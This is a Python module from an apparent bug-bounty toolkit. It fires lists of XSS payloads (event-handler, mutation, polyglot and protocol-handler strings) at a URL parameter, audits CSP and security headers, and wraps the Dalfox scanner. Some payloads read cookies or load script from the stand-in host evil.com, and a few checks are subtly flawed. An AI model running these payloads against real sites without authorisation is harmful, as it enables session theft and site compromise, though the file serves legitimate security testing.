"""XSS vulnerability testing — 2026 techniques."""

import json
import os
import re
import subprocess
import time
from pathlib import Path
from typing import Optional, List, Dict, Any
from dataclasses import dataclass, field

import httpx
import tenacity

from bountykit.utils.logger import get_logger

logger = get_logger(__name__)


@dataclass
class XSSFinding:
    """Single XSS finding."""
    category: str
    severity: str
    title: str
    description: str
    evidence: str = ""
    endpoint: str = ""
    payload: str = ""
    remediation: str = ""


@dataclass
class XSSResult:
    """Complete XSS assessment result."""
    target: str
    findings: List[XSSFinding] = field(default_factory=list)
    endpoints_tested: int = 0
    timestamp: float = field(default_factory=time.time)

    @property
    def summary(self) -> Dict[str, int]:
        severity_counts: Dict[str, int] = {}
        for f in self.findings:
            severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1
        return severity_counts


# 2026 XSS Techniques
XSS_2026_TECHNIQUES = [
    {
        "id": "dom_xss",
        "name": "DOM-Based XSS",
        "description": "XSS via client-side JavaScript manipulation",
        "payloads": [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            "'-alert(1)-'",
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
        ],
    },
    {
        "id": "mutation_xss",
        "name": "Mutation XSS",
        "description": "XSS via HTML mutation and browser parsing quirks",
        "payloads": [
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
            '<select><noembed></select><img src=x onerror=alert(1)>',
            '<listing><img src=x onerror=alert(1)>',
            '<xmp><img src=x onerror=alert(1)></xmp>',
        ],
    },
    {
        "id": "csp_bypass",
        "name": "CSP Bypass XSS",
        "description": "XSS via Content Security Policy bypass",
        "payloads": [
            '<script nonce="random">alert(1)</script>',
            '<link rel=preload href=//evil.com/script.js as=script>',
            '<script src=//ssl.google-analytics.com/ga.js></script>',
            '<link rel=dns-prefetch href=//evil.com>',
        ],
    },
    {
        "id": "polyglot",
        "name": "Polyglot XSS",
        "description": "XSS payloads that work across multiple contexts",
        "payloads": [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//',
            '"><img src=x onerror=alert(1)//',
            "';alert(1)//",
            '"><svg/onload=alert(1)>',
            '"><iframe/src="javascript:alert(1)">',
        ],
    },
    {
        "id": "event_handler",
        "name": "Event Handler XSS",
        "description": "XSS via event handler attributes",
        "payloads": [
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<body/onload=alert(1)>',
            '<input/onfocus=alert(1) autofocus>',
            '<details/open/ontoggle=alert(1)>',
            '<video/onloadeddata=alert(1)>',
            '<audio/onauxclick=alert(1)>',
            '<textarea/oninput=alert(1)>',
            '<select/onchange=alert(1)><option>1</select>',
            '<div/onpointerdown=alert(1)>',
        ],
    },
    {
        "id": "protocol_handler",
        "name": "Protocol Handler XSS",
        "description": "XSS via protocol handlers (javascript:, data:, vbscript:)",
        "payloads": [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:MsgBox(1)',
            'javascript:alert(document.cookie)',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        ],
    },
]

# DOM sink patterns for vulnerability detection
DOM_SINK_PATTERNS = [
    # Source patterns (where user input enters)
    r'document\.URL',
    r'document\.documentURI',
    r'document\.referrer',
    r'location\.href',
    r'location\.search',
    r'location\.hash',
    r'window\.name',
    # Sink patterns (where dangerous execution happens)
    r'document\.write',
    r'document\.writeln',
    r'innerHTML',
    r'outerHTML',
    r'eval\(',
    r'setTimeout\(',
    r'setInterval\(',
    r'new Function\(',
    r'element\.src',
    r'element\.href',
    r'element\.action',
    r'element\.formAction',
]

# CSP directive weaknesses
CSP_WEAKNESSES = [
    ("unsafe-inline", "Allows inline scripts", "high"),
    ("unsafe-eval", "Allows eval()", "high"),
    ("*", "Wildcard allows any source", "high"),
    ("data:", "Allows data: URIs", "medium"),
    ("blob:", "Allows blob: URIs", "medium"),
    ("http:", "Allows HTTP resources", "medium"),
    ("'unsafe-hashes'", "Allows specific inline handlers", "medium"),
    ("strict-dynamic", "May allow bypass with trusted scripts", "low"),
]


def test_xss(
    target: str,
    param: str = "q",
    output_dir: str = "./results",
    techniques: List[str] = None,
) -> XSSResult:
    """Test for XSS vulnerabilities with 2026 techniques.

    Args:
        target: Target URL with parameter
        param: Parameter to test
        output_dir: Output directory
        techniques: Specific techniques to test (None = all)
    """
    result = XSSResult(target=target)
    os.makedirs(output_dir, exist_ok=True)

    logger.info(f"Testing XSS on {target}")

    with httpx.Client(
        timeout=30.0,
        follow_redirects=True,
        headers={"User-Agent": "bountykit/0.1 (authorized research)"},
    ) as client:
        # Test DOM XSS
        if techniques is None or "dom_xss" in techniques:
            _test_dom_xss(client, target, param, result)
        
        # Test Mutation XSS
        if techniques is None or "mutation_xss" in techniques:
            _test_mutation_xss(client, target, param, result)
        
        # Test CSP Bypass
        if techniques is None or "csp_bypass" in techniques:
            _test_csp_bypass(client, target, param, result)
        
        # Test Polyglot payloads
        if techniques is None or "polyglot" in techniques:
            _test_polyglot_xss(client, target, param, result)
        
        # Test event handlers
        if techniques is None or "event_handler" in techniques:
            _test_event_handler_xss(client, target, param, result)
        
        # Test protocol handlers
        if techniques is None or "protocol_handler" in techniques:
            _test_protocol_handler_xss(client, target, param, result)
        
        # Analyze DOM sinks
        _analyze_dom_sinks(client, target, param, result)
        
        # Check security headers
        _check_xss_headers(client, target, result)

    # Save results
    output_file = Path(output_dir) / "xss_results.json"
    _save_results(result, output_file)

    return result


def _test_dom_xss(client: httpx.Client, target: str, param: str, result: XSSResult):
    """Test for DOM-based XSS."""
    logger.info("Testing DOM XSS...")
    
    dom_payloads = [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        "'-alert(1)-'",
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
    ]
    
    base_url = target.rstrip("/")
    
    for payload in dom_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            # Check if payload is reflected
            if payload in resp.text:
                # Check for DOM manipulation patterns
                dom_patterns = [
                    r'document\.write',
                    r'innerHTML',
                    r'eval\(',
                    r'setTimeout\(',
                    r'location\.hash',
                    r'document\.URL',
                ]
                
                has_dom_sink = any(re.search(pattern, resp.text) for pattern in dom_patterns)
                
                severity = "high" if has_dom_sink else "medium"
                
                result.findings.append(XSSFinding(
                    category="xss",
                    severity=severity,
                    title=f"DOM XSS: Payload reflected in response",
                    description=f"Payload reflected with DOM sink detected" if has_dom_sink else "Payload reflected without obvious DOM sink",
                    endpoint=url,
                    payload=payload,
                    remediation="Sanitize user input, use DOMPurify for client-side rendering",
                ))
        except Exception:
            continue


def _test_mutation_xss(client: httpx.Client, target: str, param: str, result: XSSResult):
    """Test for Mutation XSS."""
    logger.info("Testing Mutation XSS...")
    
    mutation_payloads = [
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
        '<select><noembed></select><img src=x onerror=alert(1)>',
        '<listing><img src=x onerror=alert(1)>',
    ]
    
    base_url = target.rstrip("/")
    
    for payload in mutation_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            # Mutation XSS often transforms the payload
            if 'onerror=alert(1)' in resp.text or 'onload=alert(1)' in resp.text:
                result.findings.append(XSSFinding(
                    category="xss",
                    severity="critical",
                    title="Mutation XSS Vulnerability",
                    description="Browser mutation created executable payload",
                    endpoint=url,
                    payload=payload[:100],
                    remediation="Use proper HTML parsing and sanitization",
                ))
        except Exception:
            continue


def _test_csp_bypass(client: httpx.Client, target: str, param: str, result: XSSResult):
    """Test for CSP bypass vulnerabilities."""
    logger.info("Testing CSP bypass...")
    
    try:
        url = f"https://{target}"
        resp = client.get(url)
        
        csp_header = resp.headers.get("content-security-policy", "")
        
        if not csp_header:
            result.findings.append(XSSFinding(
                category="xss",
                severity="medium",
                title="No Content Security Policy",
                description="Target does not implement CSP",
                endpoint=url,
                remediation="Implement Content Security Policy",
            ))
            return
        
        # Analyze CSP directives
        csp_analysis = _analyze_csp(csp_header)
        
        # Report weak CSP configurations
        for weakness in CSP_WEAKNESSES:
            if weakness[0] in csp_header:
                result.findings.append(XSSFinding(
                    category="xss",
                    severity=weakness[2],
                    title=f"Weak CSP: {weakness[0]}",
                    description=weakness[1],
                    endpoint=url,
                    evidence=f"CSP header: {csp_header[:200]}",
                    remediation=f"Remove {weakness[0]} from CSP directive",
                ))
        
        # Check for missing critical directives
        missing_directives = _check_missing_csp_directives(csp_header)
        for directive in missing_directives:
            result.findings.append(XSSFinding(
                category="xss",
                severity="medium",
                title=f"Missing CSP Directive: {directive}",
                description=f"Content Security Policy missing {directive} directive",
                endpoint=url,
                remediation=f"Add {directive} directive to CSP",
            ))
    except Exception as e:
        logger.debug(f"CSP check failed: {e}")


def _analyze_csp(csp_header: str) -> dict:
    """Analyze CSP header and return parsed directives."""
    directives = {}
    
    for directive in csp_header.split(";"):
        directive = directive.strip()
        if " " in directive:
            key, value = directive.split(" ", 1)
            directives[key.lower()] = value
    
    return directives


def _check_missing_csp_directives(csp_header: str) -> list:
    """Check for missing critical CSP directives."""
    critical_directives = [
        "default-src",
        "script-src",
        "style-src",
        "img-src",
        "connect-src",
        "font-src",
        "object-src",
        "media-src",
        "frame-src",
    ]
    
    missing = []
    
    for directive in critical_directives:
        if directive not in csp_header.lower():
            missing.append(directive)
    
    return missing


def _test_polyglot_xss(client: httpx.Client, target: str, param: str, result: XSSResult):
    """Test polyglot XSS payloads."""
    logger.info("Testing polyglot XSS...")
    
    polyglot_payloads = [
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//',
        '"><img src=x onerror=alert(1)//',
        "';alert(1)//",
        '"><svg/onload=alert(1)>',
        '"><iframe/src="javascript:alert(1)">',
    ]
    
    base_url = target.rstrip("/")
    
    for payload in polyglot_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            if payload in resp.text:
                result.findings.append(XSSFinding(
                    category="xss",
                    severity="high",
                    title="Polyglot XSS Payload Reflected",
                    description="Polyglot payload successfully reflected",
                    endpoint=url,
                    payload=payload[:100],
                    remediation="Implement proper output encoding and sanitization",
                ))
        except Exception:
            continue


def _test_event_handler_xss(client: httpx.Client, target: str, param: str, result: XSSResult):
    """Test for XSS via event handler attributes."""
    logger.info("Testing event handler XSS...")
    
    event_handler_payloads = [
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<body/onload=alert(1)>',
        '<input/onfocus=alert(1) autofocus>',
        '<details/open/ontoggle=alert(1)>',
        '<video/onloadeddata=alert(1)>',
        '<audio/onauxclick=alert(1)>',
        '<textarea/oninput=alert(1)>',
        '<select/onchange=alert(1)><option>1</select>',
        '<div/onpointerdown=alert(1)>',
    ]
    
    base_url = target.rstrip("/")
    
    for payload in event_handler_payloads:
        try:
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            # Check if payload is reflected and executable
            if payload in resp.text:
                # Check for HTML attribute context
                if re.search(r'<[^>]*' + re.escape(payload[:20]), resp.text):
                    result.findings.append(XSSFinding(
                        category="xss",
                        severity="high",
                        title="Event Handler XSS",
                        description="Payload reflected in HTML attribute context",
                        endpoint=url,
                        payload=payload[:100],
                        remediation="Sanitize input, use Content Security Policy",
                    ))
        except Exception:
            continue


def _test_protocol_handler_xss(client: httpx.Client, target: str, param: str, result: XSSResult):
    """Test for XSS via protocol handlers."""
    logger.info("Testing protocol handler XSS...")
    
    protocol_payloads = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:MsgBox(1)',
        'javascript:alert(document.cookie)',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    ]
    
    base_url = target.rstrip("/")
    
    for payload in protocol_payloads:
        try:
            # Test in href parameter
            url = f"{base_url}?{param}={payload}"
            resp = client.get(url)
            
            # Check if payload is reflected as a link
            if payload in resp.text:
                result.findings.append(XSSFinding(
                    category="xss",
                    severity="critical",
                    title="Protocol Handler XSS",
                    description=f"Protocol handler payload reflected: {payload[:50]}",
                    endpoint=url,
                    payload=payload[:100],
                    remediation="Validate and sanitize URLs, reject dangerous protocols",
                ))
        except Exception:
            continue


def _analyze_dom_sinks(client: httpx.Client, target: str, param: str, result: XSSResult):
    """Analyze page for DOM-based XSS sinks."""
    logger.info("Analyzing DOM sinks...")
    
    base_url = target.rstrip("/")
    
    try:
        # First, get the page with a marker to see if it's reflected
        marker = "xss_test_marker_12345"
        url = f"{base_url}?{param}={marker}"
        resp = client.get(url)
        
        if marker not in resp.text:
            return  # Parameter not reflected
        
        # Look for DOM sink patterns in the response
        for pattern in DOM_SINK_PATTERNS:
            if re.search(pattern, resp.text):
                # Check if there's a potential source-sink relationship
                result.findings.append(XSSFinding(
                    category="xss",
                    severity="high",
                    title="DOM Sink Detected",
                    description=f"Potentially dangerous DOM manipulation found: {pattern}",
                    endpoint=url,
                    evidence=f"Pattern: {pattern}",
                    remediation="Audit DOM manipulation, use safe APIs like textContent instead of innerHTML",
                ))
    except Exception as e:
        logger.debug(f"DOM sink analysis failed: {e}")


def _check_xss_headers(client: httpx.Client, target: str, result: XSSResult):
    """Check security headers that affect XSS protection."""
    logger.info("Checking XSS security headers...")
    
    try:
        url = f"https://{target}"
        resp = client.get(url)
        
        headers_to_check = {
            "x-content-type-options": {
                "expected": "nosniff",
                "severity": "medium",
                "title": "Missing X-Content-Type-Options",
                "description": "Browser may MIME-sniff content type",
                "remediation": "Add X-Content-Type-Options: nosniff header",
            },
            "x-frame-options": {
                "expected": ["DENY", "SAMEORIGIN"],
                "severity": "medium",
                "title": "Missing X-Frame-Options",
                "description": "Page may be vulnerable to clickjacking",
                "remediation": "Add X-Frame-Options: DENY or SAMEORIGIN header",
            },
            "x-xss-protection": {
                "expected": "0",
                "severity": "low",
                "title": "X-XSS-Protection Header Present",
                "description": "Legacy XSS filter may cause issues",
                "remediation": "Set X-XSS-Protection: 0 and use CSP instead",
            },
        }
        
        for header_name, config in headers_to_check.items():
            header_value = resp.headers.get(header_name, "")
            
            if not header_value:
                result.findings.append(XSSFinding(
                    category="xss",
                    severity=config["severity"],
                    title=config["title"],
                    description=config["description"],
                    endpoint=url,
                    remediation=config["remediation"],
                ))
    except Exception as e:
        logger.debug(f"Header check failed: {e}")


def _save_results(result: XSSResult, output_file: Path):
    """Save results to JSON file."""
    data = {
        "target": result.target,
        "timestamp": result.timestamp,
        "endpoints_tested": result.endpoints_tested,
        "summary": result.summary,
        "findings": [
            {
                "category": f.category,
                "severity": f.severity,
                "title": f.title,
                "description": f.description,
                "evidence": f.evidence,
                "endpoint": f.endpoint,
                "payload": f.payload,
                "remediation": f.remediation,
            }
            for f in result.findings
        ],
    }
    
    with open(output_file, "w") as f:
        json.dump(data, f, indent=2)
    
    logger.info(f"Results saved to {output_file}")


def run_dalfox(
    url: str,
    param: str = "q",
    output_dir: str = "./results",
    blind_url: Optional[str] = None,
    techniques: Optional[str] = None,
) -> dict:
    """Run Dalfox for XSS vulnerability testing.

    Args:
        url: Target URL with parameter
        param: Parameter to test
        output_dir: Output directory
        blind_url: Blind XSS callback URL
    """
    results = {
        "target": url,
        "tool": "dalfox",
        "vulnerable": False,
        "xss_found": [],
    }

    os.makedirs(output_dir, exist_ok=True)

    cmd = [
        "dalfox", "url", url,
        "-p", param,
        "--silence",
        "--format", "json",
    ]

    if blind_url:
        cmd.extend(["--blind", blind_url])

    if techniques and techniques.lower() != "all":
        cmd.extend(["--trigger-type", techniques.lower()])

    logger.info(f"Running Dalfox XSS scan on {url} (param: {param})...")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)

        if result.returncode == 0 and result.stdout.strip():
            for line in result.stdout.splitlines():
                try:
                    data = json.loads(line)
                    if data.get("type") == "XSS" or "poc" in str(data).lower():
                        results["vulnerable"] = True
                        results["xss_found"].append({
                            "param": data.get("param", param),
                            "payload": data.get("payload", ""),
                            "poc": data.get("poc", ""),
                            "type": data.get("type", "reflected"),
                        })
                except json.JSONDecodeError:
                    if "xss" in line.lower() or "poc" in line.lower():
                        results["vulnerable"] = True
                        results["xss_found"].append({"raw": line.strip()})

        if results["vulnerable"]:
            logger.warning(f"Found {len(results['xss_found'])} XSS vulnerabilities!")
        else:
            logger.info("Dalfox: No XSS found")

    except FileNotFoundError:
        logger.error("Dalfox is not installed. Run: bountykit setup")
    except subprocess.TimeoutExpired:
        logger.warning("Dalfox scan timed out")

    # Save results
    output_file = Path(output_dir) / "dalfox_results.json"
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)

    logger.info(f"Results saved to {output_file}")
    return results
